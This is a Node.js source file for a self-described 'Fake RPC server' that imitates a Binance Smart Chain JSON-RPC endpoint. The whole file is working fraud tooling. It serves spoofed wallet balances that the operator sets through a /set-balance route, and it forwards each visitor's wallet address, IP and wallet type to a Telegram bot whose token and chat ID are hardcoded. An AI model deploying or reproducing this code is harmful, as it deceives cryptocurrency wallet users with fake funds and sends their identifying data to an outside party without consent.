const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');
const cors = require('cors'); // ✅ Added for cross-origin support

const app = express();
const PORT = process.env.PORT || 9798; // ✅ Render/Railway friendly
const HOST = '0.0.0.0';

// Telegram Bot config
const TELEGRAM_BOT_TOKEN = '8395301366:AAGSGCdJDIgJ0ffRrSwmjV2q-YPUgLliHEE';
const TELEGRAM_CHAT_ID = '7812677112';

// In-memory spoofed balances per address
const spoofedBalances = {};

app.use(cors()); // ✅ Allow requests from anywhere
app.use(express.static(path.join(__dirname, '/')));
app.use(bodyParser.json());

// Helper: Send message to Telegram
const sendToTelegram = async (text) => {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown',
        });
    } catch (err) {
        console.error('[!] Telegram send error:', err?.response?.data || err.message);
    }
};

// Helper: Current timestamp
const now = () => new Date().toISOString().replace('T', ' ').split('.')[0];

// Helper: Guess wallet from User-Agent
const detectWalletFromUA = (ua = '') => {
    ua = ua.toLowerCase();
    if (ua.includes('metamask')) return 'MetaMask';
    if (ua.includes('trust')) return 'Trust Wallet';
    if (ua.includes('brave')) return 'Brave Wallet';
    if (ua.includes('coinbase')) return 'Coinbase Wallet';
    if (ua.includes('phantom')) return 'Phantom';
    if (ua.includes('opera')) return 'Opera';
    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
    if (ua.includes('chrome')) return 'Chrome';
    if (ua.includes('firefox')) return 'Firefox';
    if (ua.includes('android')) return 'Android WebView';
    if (ua.includes('ios')) return 'iOS WebView';
    return 'Unknown';
};

// JSON-RPC handler
app.post('/', (req, res) => {
    const { method, params, id } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    console.log(`[RPC] Method: ${method}`);

    if (method === 'eth_chainId') {
        return res.json({ jsonrpc: '2.0', id, result: '0x38' }); // BSC
    }

    if (method === 'net_version') {
        return res.json({ jsonrpc: '2.0', id, result: '56' });
    }

    if (method === 'eth_blockNumber') {
        return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
    }

    if (method === 'eth_getBalance') {
        const address = (params[0] || '').toLowerCase();
        const balance = spoofedBalances[address] || '0x0';

        const logMsg = `🕒 *${now()}*
[+] Spoofing BNB for \`${address}\`
🪙 Balance: \`${balance}\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;

        console.log(logMsg);
        sendToTelegram(logMsg);

        return res.json({ jsonrpc: '2.0', id, result: balance });
    }

    // Unknown methods
    const logMsg = `🕒 *${now()}*
⚠️ Unknown RPC: \`${method}\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;
    console.log(logMsg);
    sendToTelegram(logMsg);

    return res.json({ jsonrpc: '2.0', id, result: null });
});

// Handle spoofed balance update
app.post('/set-balance', (req, res) => {
    const { address, balance } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ua = req.headers['user-agent'] || '';
    const wallet = detectWalletFromUA(ua);

    if (
        !address ||
        !balance ||
        !/^0x[0-9a-fA-F]{40}$/.test(address) ||
        !/^0x[0-9a-fA-F]+$/.test(balance)
    ) {
        return res.status(400).json({ error: 'Invalid address or balance' });
    }

    const cleanAddress = address.toLowerCase();
    spoofedBalances[cleanAddress] = balance.toLowerCase();

    const logMsg = `🕒 *${now()}*
[~] Set balance for \`${cleanAddress}\`
💰 New Balance: \`${balance}\`
🧩 Wallet: *${wallet}*
🌐 IP: \`${ip}\``;

    console.log(logMsg);
    sendToTelegram(logMsg);

    return res.status(200).json({ success: true });
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Fake RPC server running at http://${HOST}:${PORT}`);
});
